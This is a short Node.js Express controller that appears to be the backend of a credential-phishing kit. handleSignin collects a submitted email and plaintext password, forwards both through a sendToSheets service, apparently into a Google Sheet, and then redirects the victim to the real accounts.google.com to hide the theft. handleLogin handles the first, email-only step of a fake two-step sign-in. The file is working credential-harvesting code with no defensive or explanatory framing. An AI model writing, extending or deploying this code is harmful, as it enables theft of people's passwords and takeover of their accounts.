// controllers/auth.controller.js
const { sendToSheets } = require('../services/sheets.service');

exports.handleLogin = (req, res) => {
  const { username } = req.body;
  const email = username;
  if (!email || email.trim() === '') {
    return res.status(400).json({ ok: false });
  }

  // Tell browser it's allowed to proceed
  res.json({ ok: true, email });
};

exports.handleSignin = async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password || password.trim() === "") {
    return res.status(400).json({ ok: false });
  }

  try {
    await sendToSheets({ email, password });

    // Tell browser what to do next
    res.json({
      ok: true,
      redirectUrl: 'https://accounts.google.com/'
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false });
  }
};
